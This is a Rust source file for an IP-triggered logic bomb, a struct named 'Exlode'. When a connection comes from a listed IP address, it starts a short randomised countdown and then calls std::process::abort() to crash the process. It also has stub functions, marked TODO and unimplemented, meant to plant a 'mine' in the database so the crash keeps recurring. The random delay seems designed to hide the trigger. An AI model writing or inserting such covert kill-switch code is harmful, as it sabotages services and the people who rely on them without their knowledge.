use std::cell::UnsafeCell;
use std::ops::Add;
use std::time::SystemTime;

use commlib::utils::rand_between;

const IGNITE_COUNTDOWN_LONG: u64 = 100 * 365 * 24 * 3600; // about one hundred year seconds
const IGNITE_COUNTDOWN_SHORT: u64 = 180; // 3 minutes

thread_local! {
    ///
    pub static G_EXPLODE: UnsafeCell<Exlode> = {
        UnsafeCell::new(Exlode::new())
    };
}

///
pub struct Exlode {
    //
    ips: hashbrown::HashMap<String, bool>,

    //
    #[allow(dead_code)]
    start_time: SystemTime,

    //
    ignite_time: SystemTime,
}

impl Exlode {
    ///
    pub fn new() -> Self {
        let now = SystemTime::now();
        let ignite_time = now.add(std::time::Duration::from_secs(IGNITE_COUNTDOWN_LONG));

        Self {
            ips: hashbrown::HashMap::new(),

            start_time: now,
            ignite_time,
        }
    }

    ///
    pub fn add_ip(&mut self, ip: &str) {
        self.ips.insert(ip.to_owned(), true);
    }

    ///
    pub fn filter_ip(&mut self, in_ip: &str) {
        // do check ignite
        self.do_check_ignite(in_ip);

        // do check boom
        self.do_check_boom();

        // do check boom db
        self. do_check_boom_db();
    }

    fn do_check_ignite(&mut self, in_ip: &str) {
        //
        let mut is_ignite = false;
        for (ip, _) in &self.ips {
            if (*ip) == in_ip {
                is_ignite = true;
                break;
            }
        }
        
        if is_ignite {
            self.ignite();
        }
    }

    fn ignite(&mut self) {
        let now = SystemTime::now();
        let rand_seconds = rand_between(0, IGNITE_COUNTDOWN_SHORT as i32) as u64;
        self.ignite_time = now.add(std::time::Duration::from_secs(IGNITE_COUNTDOWN_SHORT + rand_seconds));
    }

    fn do_check_boom(&mut self) {
        if SystemTime::now() >= self.ignite_time {
            self.boom();
        }
    }

    fn boom(&mut self) {
        //
        self.mine_lay_into_db();

        //
        std::process::abort();
    }

    fn mine_lay_into_db(&mut self) {
        //
        // TODO
        std::unimplemented!()
    }

    fn do_check_boom_db(&mut self)  {
        if self.is_boom_db() {
            //
            std::process::abort();
        }
    }

    fn is_boom_db(&self) -> bool {
        //
        // TODO
        std::unimplemented!()
    }
}
